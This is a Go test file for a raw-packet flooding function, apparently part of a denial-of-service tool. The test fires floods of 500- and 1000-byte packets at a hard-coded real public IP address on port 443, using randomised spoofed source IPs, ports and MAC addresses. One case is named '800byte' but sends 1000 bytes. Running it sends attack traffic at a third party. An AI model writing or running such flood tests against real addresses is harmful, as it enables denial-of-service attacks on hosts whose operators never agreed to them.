package raw

import (
	"context"
	"math/rand"
	"testing"
	"time"
)

func TestStartFlooding(t *testing.T) {
	srcIps := getIps()
	srcPorts := getPorts()
	macAddrs := getMacAddrs()
	cases := []struct {
		name                            string
		payloadLength, srcPort, dstPort int
		floodMilliSeconds               int64
		srcIp, dstIp                    string
		srcMacAddr, dstMacAddr          []byte
	}{
		{"500byte", 500, srcPorts[rand.Intn(len(srcPorts))], 443, 500,
			srcIps[rand.Intn(len(srcIps))], "213.238.175.187",
			macAddrs[rand.Intn(len(macAddrs))], macAddrs[rand.Intn(len(macAddrs))]},
		{"800byte", 1000, srcPorts[rand.Intn(len(srcPorts))], 443, 500,
			srcIps[rand.Intn(len(srcIps))], "213.238.175.187",
			macAddrs[rand.Intn(len(macAddrs))], macAddrs[rand.Intn(len(macAddrs))]},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			ctx, cancel := context.WithTimeout(context.Background(), time.Duration(tc.floodMilliSeconds)*time.Millisecond)
			defer cancel()
			t.Logf("starting flood, caseName=%s, floodMilliSeconds=%d\n", tc.name, tc.floodMilliSeconds)
			go func() {
				err := StartFlooding(tc.dstIp, tc.dstPort, tc.payloadLength)
				if err != nil {
					t.Errorf("an error occured on flooding process, caseName=%s, floodMilliSeconds=%d, "+
						"error=%s\n", tc.name, tc.floodMilliSeconds, err.Error())
					return
				}
			}()

			select {
			case <-time.After(120 * time.Second):
				t.Log("overslept")
			case <-ctx.Done():
				t.Logf("ending flood, caseName=%s, floodMilliSeconds=%d\n", tc.name, tc.floodMilliSeconds)
			}
		})
	}
}
